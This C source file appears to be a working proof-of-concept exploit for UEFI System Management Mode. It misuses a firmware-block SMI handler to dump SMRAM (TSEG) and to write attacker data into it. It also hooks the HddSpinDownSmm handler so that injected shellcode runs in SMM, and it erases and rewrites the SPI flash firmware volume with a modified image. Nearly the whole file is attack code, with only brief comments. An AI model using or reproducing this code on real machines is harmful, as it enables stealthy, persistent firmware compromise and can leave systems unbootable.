#include "pci.h"
#include "common_chipset.h"
#include "Util.h"
#include "physmem.h"
#include "smm_communicate.h"
#include "UEFIVars.h"
#include "smi.h"


#define SPI_READ    0x00
#define SPI_WRITE   0x01
#define SPI_ERASE   0x02

#define SMI_CODE    0x16

#define TSEG_BASE   0xAE000000
#define TSEG_SIZE   16 * 1024 * 1024
#define TSEG_GUARD_PAGE 0xAEF0E000

#define RT_CODE_START   0xAAE00000
#define RT_CODE_END     0xAAF00000

#define PAYLOAD_ADDR    0xAF000000

#define FV_ADDR         0x0073A000


typedef struct {
  UINT64 ReturnStatus;
  UINT64 Signature;
  UINT64 FlashAddress;
  UINT64 Unk;
  UINT64 DataSize;
  char Data[0];
} FW_BLOCK_SERVICE_COMMBUFFER;


void read_2k(UINT32 phys_addr, char* buffer)
{
    UINT64 comm_buf_addr = TSEG_BASE - PAGE_SIZE;

    char* comm_buf = (char *)map_physical_memory(comm_buf_addr, PAGE_SIZE);
    if (!comm_buf) {
        printf("Failed to allocate user physical mem\n");
        return;
    }

    SMM_CORE_PRIVATE_DATA *smm_core_private_data = (SMM_CORE_PRIVATE_DATA *) search_in_physical_memory(RT_CODE_START, RT_CODE_END,
        (BYTE *) SMM_CORE_PRIVATE_DATA_SIGNATURE,  strlen(SMM_CORE_PRIVATE_DATA_SIGNATURE));
    if (!smm_core_private_data) {
        printf(" - read_spi_flash: failed to find SMM_CORE_PRIVATE_DATA\n");
        return;
    }

    SW_SMI_CALL smi_call = { 0 };
    smi_call.SwSmiNumber = SMI_CODE;
    smi_call.SwSmiData = SPI_READ;
    smi_call.rbx = 0x00026000 + 40;
    smi_call.rdx = 0xB0;
    smi_call.rsi = comm_buf_addr;

    memset((void *) comm_buf, 0x00, PAGE_SIZE);
    
    FW_BLOCK_SERVICE_COMMBUFFER *fwblockservice_call = (FW_BLOCK_SERVICE_COMMBUFFER *) comm_buf;
    fwblockservice_call->Signature = 0x41464D53;
    fwblockservice_call->FlashAddress = phys_addr;
    fwblockservice_call->DataSize = 2048;

    trigger_smi(&smi_call);

    if (fwblockservice_call->ReturnStatus != EFI_SUCCESS) {
        printf("SMM communicate call failed!\n");
    }

    if(buffer)
        memcpy(buffer, &fwblockservice_call->Data[0], fwblockservice_call->DataSize);
    else
        print_memory(0, (char *) comm_buf, 0x100);

    unmap_physical_memory((void *)comm_buf, PAGE_SIZE);
    unmap_physical_memory((void *)smm_core_private_data, PAGE_SIZE);
}


char* tseg_read(UINT32 read_size)
{
    if(read_size & 0xFFF)
    {
        printf("Read size should be page-aligned\n");
        return NULL;
    }

    char* buffer = (char *)calloc(1, read_size);

    UINT32 guard_page_addr = TSEG_GUARD_PAGE;
    UINT32 guard_page_cnt = 12;

    for(unsigned int i = 0; i < read_size; i += PAGE_SIZE)
    {
        uint32_t addr = TSEG_BASE + i;
        printf("Addr: %08x\n", addr);
        // Sleep(100);

        if(guard_page_cnt && addr == guard_page_addr)
        {
            guard_page_addr += 10 * PAGE_SIZE;
            guard_page_cnt--;
            continue;
        }

        read_2k(addr, buffer + i);
        read_2k(addr + 2048, buffer + i + 2048);
    }

    return buffer;
}


void tseg_dump(char *filename)
{
    printf("Reading TSEG memory\n");
    char *tseg_data = tseg_read(TSEG_SIZE);

    FILE* fptr = fopen(filename, "wb");
    if(fptr == NULL)
    {
      printf("Could not open file!\n");   
      return;             
    }

    printf("Writing to file\n");
    fwrite(tseg_data, TSEG_SIZE, 1, fptr);
    
    fclose(fptr);
    printf("Finished writing to file\n");

    free(tseg_data);
}


void tseg_write(char* buffer, UINT32 buffer_size)
{

    UINT32 payload_pages = (buffer_size + PAGE_SIZE - 1) / PAGE_SIZE;
    UINT32 payload_size = payload_pages * PAGE_SIZE;

    // Make backup of original data
    char *backup_buf = (char *)calloc(1, payload_size);
    UINT32 write_size = 0;
    bool last_page = false;

    for(unsigned int i = 0; i < payload_size; i += PAGE_SIZE)
    {
        last_page = ((payload_size - PAGE_SIZE) == i);
        write_size = last_page ? buffer_size - ((payload_pages - 1) * PAGE_SIZE) : PAGE_SIZE;

        char *payload_page = (char *)map_physical_memory(PAYLOAD_ADDR + i, PAGE_SIZE);
        if (!payload_page) {
            printf("Failed to map payload memory\n");
            return;
        }

        memcpy(backup_buf + i, payload_page, PAGE_SIZE);
        memcpy(payload_page, buffer + i, write_size);
        unmap_physical_memory(payload_page, PAGE_SIZE);
    }

    // Modify TSEG
    UINT64 comm_buf_addr = TSEG_BASE - sizeof(FW_BLOCK_SERVICE_COMMBUFFER);
    UINT32 comm_buf_page = comm_buf_addr & 0xFFFFF000;
    UINT32 comm_buf_offset = comm_buf_addr & 0xFFF;

    char *comm_buf = (char *)map_physical_memory(comm_buf_page, PAGE_SIZE);
    if (!comm_buf) {
        printf("Failed to map comm buffer\n");
        return;
    }

    SMM_CORE_PRIVATE_DATA *smm_core_private_data = (SMM_CORE_PRIVATE_DATA *) search_in_physical_memory(RT_CODE_START, RT_CODE_END,
        (BYTE *) SMM_CORE_PRIVATE_DATA_SIGNATURE,  strlen(SMM_CORE_PRIVATE_DATA_SIGNATURE));
    if (!smm_core_private_data) {
        printf("Failed to find SMM_CORE_PRIVATE_DATA\n");
        return;
    }

    SW_SMI_CALL smi_call = { 0 };
    smi_call.SwSmiNumber = SMI_CODE;
    smi_call.SwSmiData = SPI_READ;
    smi_call.rbx = 0x00026000 + 40;
    smi_call.rdx = 0xB0;
    smi_call.rsi = comm_buf_addr;

    memset((void *)comm_buf, 0x00, PAGE_SIZE);
    
    FW_BLOCK_SERVICE_COMMBUFFER *fwblockservice_call = (FW_BLOCK_SERVICE_COMMBUFFER *)(comm_buf + comm_buf_offset);
    fwblockservice_call->Signature = 0x41464D53;
    fwblockservice_call->FlashAddress = PAYLOAD_ADDR;
    fwblockservice_call->DataSize = buffer_size;
    
    trigger_smi(&smi_call);     

    if (fwblockservice_call->ReturnStatus != EFI_SUCCESS) {
        printf("SMM communicate call failed!\n");
    }

    unmap_physical_memory((void *)comm_buf, PAGE_SIZE);
    unmap_physical_memory((void *)smm_core_private_data, PAGE_SIZE);

    // Restore original data
    for(unsigned int i = 0; i < payload_size; i += PAGE_SIZE)
    {
        char *payload_page = (char *)map_physical_memory(PAYLOAD_ADDR + i, PAGE_SIZE);
        if (!payload_page) {
            printf("Failed to map payload memory\n");
            return;
        }
        memcpy(payload_page, backup_buf + i, PAGE_SIZE);
        unmap_physical_memory(payload_page, PAGE_SIZE);
    }

    free(backup_buf);
}

void tseg_patch(UINT32 tseg_offset, char* buffer, UINT32 buffer_size)
{
    UINT32 tseg_patch_size = tseg_offset + buffer_size;
    if(tseg_patch_size >= TSEG_SIZE)
    {
        printf("Incorrect offset and/or buffer size passed\n");
        return;
    }

    printf("Reading TSEG\n");
    UINT32 tseg_read_size = ((tseg_offset + buffer_size) / PAGE_SIZE) * PAGE_SIZE;
    char* tseg_data = tseg_read(tseg_read_size);

    printf("Patching 0x%08x bytes of TSEG\n", tseg_patch_size);
    memcpy(tseg_data + tseg_offset, buffer, buffer_size);
    tseg_write(tseg_data, tseg_patch_size);

    printf("Finished patching TSEG\n");
    free(tseg_data);
}


void tseg_smi_hook()
{    
    UINT32 hook_size = 10;
    char *hook = "\x48\xC7\xC0\x00\x10\x00\x00"     // mov  rax,0x1000
                        "\xFF\xD0"                        // call rax
                        "\xC3";                           // ret

    printf("Overwriting HddSpinDownSmm SMI handler\n");
    tseg_patch(0x7426e4, hook, hook_size);
}

void tseg_smi_trigger()
{
    UINT32 shellcode_addr = 0x1000;

    // Increments value
    // UINT32 shellcode_len = 13;
    // char *shellcode = "\x48\xC7\xC0\x20\x10\x00\x00"        // mov  rax, 0x1020
    //                    "\xFE\x00"                           // inc  byte ptr [rax]
    //                    "\x48\x31\xC0"                       // xor  rax, rax
    //                    "\xC3";                              // ret

    // Reads CS register
    // UINT32 shellcode_len = 22;
    // char *shellcode = "\x48\xC7\xC1\x20\x10\x00\x00"        // mov  rcx, 0x1020
    //                    "\x48\x31\xC0"                       // xor  rax, rax
    //                    "\x8C\xC8"                           // mov eax, cs
    //                    "\x83\xE0\x03"                       // and eax, 0x3
    //                    "\x48\x89\x01"                       // mov [rcx], rax
    //                    "\x48\x31\xC0"                       // xor  rax, rax
    //                    "\xC3";                              // ret

    // Reads CR0 register
    // UINT32 shellcode_len = 20;
    // char *shellcode = "\x48\xC7\xC1\x20\x10\x00\x00"        // mov  rcx, 0x1020
    //                    "\x48\x31\xC0"                       // xor  rax, rax
    //                    "\x0F\x20\xC0"                       // mov rax, cr0
    //                    "\x48\x89\x01"                       // mov [rcx], rax
    //                    "\x48\x31\xC0"                       // xor  rax, rax
    //                    "\xC3";                              // ret

    // Reads CR3 register
    UINT32 shellcode_len = 20;
    char *shellcode = "\x48\xC7\xC1\x20\x10\x00\x00"        // mov  rcx, 0x1020
                       "\x48\x31\xC0"                       // xor  rax, rax
                       "\x0F\x20\xD8"                       // mov rax, cr3
                       "\x48\x89\x01"                       // mov [rcx], rax
                       "\x48\x31\xC0"                       // xor  rax, rax
                       "\xC3";                              // ret

    // Write the shellcode
    char *shellcode_page = (char *)map_physical_memory(shellcode_addr & 0xFFFFF000, PAGE_SIZE);
    if (!shellcode_page) {
        printf("Failed to allocate user physical mem\n");
        return;
    }
    
    memcpy(shellcode_page, (char *)shellcode, shellcode_len);
    memset(shellcode_page + 32, 0x00, 8);

    printf("Read value before %llxx\n", *(UINT64 *)(shellcode_page + 32));
    
    SW_SMI_CALL smi_call = { 0 };
    smi_call.SwSmiNumber =  0xC4;

    trigger_smi(&smi_call);

    printf("Read value after %llx\n", *(UINT64 *)(shellcode_page + 32));

}


void spi_write_2k(UINT32 flash_addr, char* buffer, UINT32 buffer_size)
{
    if(buffer_size > 2048)
    {
        printf("Error: Only support writes up to 2k byte writes\n");
        return;
    }
    
    UINT64 comm_buf_addr = TSEG_BASE - PAGE_SIZE;
    char *comm_buf = (char *)map_physical_memory(comm_buf_addr, PAGE_SIZE);
    if (!comm_buf) {
        printf("Failed to allocate user physical mem\n");
        return;
    }

    SMM_CORE_PRIVATE_DATA *smm_core_private_data = (SMM_CORE_PRIVATE_DATA *) search_in_physical_memory(RT_CODE_START, RT_CODE_END,
        (BYTE *) SMM_CORE_PRIVATE_DATA_SIGNATURE,  strlen(SMM_CORE_PRIVATE_DATA_SIGNATURE));
    if (!smm_core_private_data) {
        printf("Failed to find SMM_CORE_PRIVATE_DATA\n");
        return;
    }

    SW_SMI_CALL smi_call = { 0 };
    smi_call.TriggerPort = 0xB0;
    smi_call.SwSmiNumber = SMI_CODE;
    smi_call.SwSmiData = SPI_WRITE;
    smi_call.rbx = 0x00026000 + 40;
    smi_call.rdx = 0xB0;
    smi_call.rsi = comm_buf_addr;

    memset((void *)comm_buf, 0x00, PAGE_SIZE);

    FW_BLOCK_SERVICE_COMMBUFFER *fwblockservice_call = (FW_BLOCK_SERVICE_COMMBUFFER *)comm_buf;
    fwblockservice_call->Signature = 0x41464D53;
    fwblockservice_call->FlashAddress = flash_addr;
    fwblockservice_call->DataSize = buffer_size;
    
    memcpy(&fwblockservice_call->Data[0], buffer, buffer_size);
    
    // printf("Memory before the SMI:\n");
    // print_memory(0, (char *) ptr, 0x100);

    trigger_smi(&smi_call);

    // printf("Return status: %d\n", fwblockservice_call->ReturnStatus);

    // printf("Memory After the SMI:\n");
    // print_memory(0, (char *) ptr, 0x100);

    if (fwblockservice_call->ReturnStatus != EFI_SUCCESS) {
        printf("SMM communicate call failed!\n");
    }
    
    unmap_physical_memory((void *)comm_buf, PAGE_SIZE);
    unmap_physical_memory((void *)smm_core_private_data, PAGE_SIZE);
}


void spi_erase_4k(UINT32 flash_addr)
{
    if((flash_addr & 0xFFF) != 0x0)
    {
        printf("Error: Flash address should be 4k sector-aligned!\n");
        return;
    }

    UINT64 comm_buf_addr = TSEG_BASE - PAGE_SIZE;
    void *comm_buf = (char *)map_physical_memory(comm_buf_addr, PAGE_SIZE);
    if (!comm_buf) {
        printf("Failed to allocate user physical mem\n");
        return;
    }

    SMM_CORE_PRIVATE_DATA *smm_core_private_data = (SMM_CORE_PRIVATE_DATA *) search_in_physical_memory(RT_CODE_START, RT_CODE_END,
        (BYTE *) SMM_CORE_PRIVATE_DATA_SIGNATURE,  strlen(SMM_CORE_PRIVATE_DATA_SIGNATURE));
    if (!smm_core_private_data) {
        printf(" - read_spi_flash: failed to find SMM_CORE_PRIVATE_DATA\n");
        return;
    }

    SW_SMI_CALL smi_call = { 0 };
    smi_call.SwSmiNumber = SMI_CODE;
    smi_call.SwSmiData = SPI_ERASE;
    smi_call.rbx = 0x00026000 + 40;
    smi_call.rdx = 0xB0;
    smi_call.rsi = comm_buf_addr;

    memset((void *)comm_buf, 0x00, PAGE_SIZE);

    FW_BLOCK_SERVICE_COMMBUFFER *fwblockservice_call = (FW_BLOCK_SERVICE_COMMBUFFER *)comm_buf;
    fwblockservice_call->Signature = 0x41464D53;
    fwblockservice_call->FlashAddress = flash_addr;
    fwblockservice_call->DataSize = 4096;
        
    // printf("Memory before the SMI:\n");
    // print_memory(0, (char *)comm_buf, 0x100);

    trigger_smi(&smi_call);   

    // printf("Return status: %d\n", fwblockservice_call->ReturnStatus);

    // printf("Memory After the SMI:\n");
    // print_memory(0, (char *)comm_buf, 0x100);

    if (fwblockservice_call->ReturnStatus != EFI_SUCCESS) {
        printf("SMM communicate call failed!\n");
    }
    
    unmap_physical_memory((void *)comm_buf, PAGE_SIZE);
    unmap_physical_memory((void *)smm_core_private_data, PAGE_SIZE);
}


// This function does not handle writing beyond one page for now
void spi_patch(UINT32 flash_addr, char *buffer, UINT32 buffer_size)
{
    // Start address for read
    UINT32 flash_page_addr = flash_addr & 0xFFFFF000;
    UINT32 flash_page_offset = flash_addr & 0x00000FFF;
    UINT32 read_addr = 0xFF000000 + flash_addr;

    // Number of bytes that needs to be read
    UINT32 alloc_size = (((flash_page_offset + buffer_size) + PAGE_SIZE - 1) / PAGE_SIZE) * PAGE_SIZE;
    char *temp_buf = (char *)calloc(1, alloc_size);

    // Reading SPI memory
    for(unsigned int i = 0; i < alloc_size; i += PAGE_SIZE)
    {
        read_2k(read_addr + i, temp_buf + i);
        read_2k(read_addr + i + 2048, temp_buf + i + 2048);
    }

    // Patching SPI memory
    memcpy(temp_buf + flash_page_offset, buffer, buffer_size);

    // Writing patched memory
    for(unsigned int i = 0; i < alloc_size; i += PAGE_SIZE)
    {
        spi_erase_4k(flash_page_addr + i);
    
        spi_write_2k(flash_page_addr + i, temp_buf + i, 2048);
        spi_write_2k(flash_page_addr + i + 2048, temp_buf + i + 2048, 2048);
    }
}


void spi_patch_fv(char *filename)
{
    // Address of firmware volume in SPI flash
    UINT32 flash_addr = FV_ADDR;

    // Read modified SPI flash firmware volume
    printf("Reading firmware volume\n");

    FILE *fptr = fopen(filename, "rb");
    if(fptr == NULL)
    {
        printf("Could not open file!\n");
        return;
    }

    fseek(fptr, 0, SEEK_END);
    long buf_size = ftell(fptr);
    fseek(fptr, 0, SEEK_SET);

    char *buf = (char *)calloc(1, buf_size);
    fread(buf, buf_size, 1, fptr);
    fclose(fptr);

    // Patch SPI flash
    printf("Patching SPI flash\n");
    spi_patch(flash_addr, buf, buf_size);
    printf("Done patching!\n");

    // Free resources
    free(buf);
}


int main(int argc, char **argv)
{ 
    open_platbox_device();

#ifdef DUMP_TSEG_START
    read_2k(TSEG_BASE, NULL);
#endif

#ifdef DUMP_TSEG
    tseg_dump("smram_complete.bin");
#endif

#ifdef RESTORE_SPI
    spi_patch_fv("fv_orig.bin");
#endif

#ifdef PATCH_SPI
    spi_patch_fv("fv_mod.bin");
#endif

    getchar();
    close_platbox_device();
    return 0;
}